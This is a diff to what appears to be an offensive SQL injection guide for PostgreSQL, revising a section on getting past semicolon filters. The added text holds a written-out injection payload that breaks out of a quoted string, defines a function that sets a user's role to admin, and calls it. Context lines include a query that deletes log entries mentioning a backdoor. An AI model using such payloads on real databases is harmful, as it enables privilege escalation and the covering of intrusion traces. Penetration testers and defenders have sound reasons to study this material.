@@ -136,16 +136,20 @@ DELETE FROM logs WHERE action LIKE '%backdoor%';
 
 ### Bypassing Filters
 
-If semicolons are filtered:
+PostgreSQL requires semicolons as statement separators - newlines alone do not terminate statements. If semicolons are blocked, alternatives for stacked queries are very limited.
+
+One possible workaround is using dollar-quoting inside function definitions, where the function body can contain semicolon-separated statements:
 
 ```sql
--- Some drivers accept newlines as statement separators
-SELECT 1
-SELECT 2
-
--- Using dollar-quoting in functions
-CREATE FUNCTION exec() RETURNS void AS $$ ... $$ LANGUAGE SQL;
+-- Dollar-quoting allows semicolons inside the function body
+'; CREATE FUNCTION exec() RETURNS void AS $$
+  INSERT INTO logs VALUES ('test');
+  UPDATE users SET role='admin' WHERE id=1;
+$$ LANGUAGE SQL;
+SELECT exec()--
 ```
+
+Note: This still requires a semicolon after the function definition to execute a subsequent `SELECT exec()` call, so it's not a true bypass - it only helps if the filter is weak or context-specific.
 
 ### Limitations
 
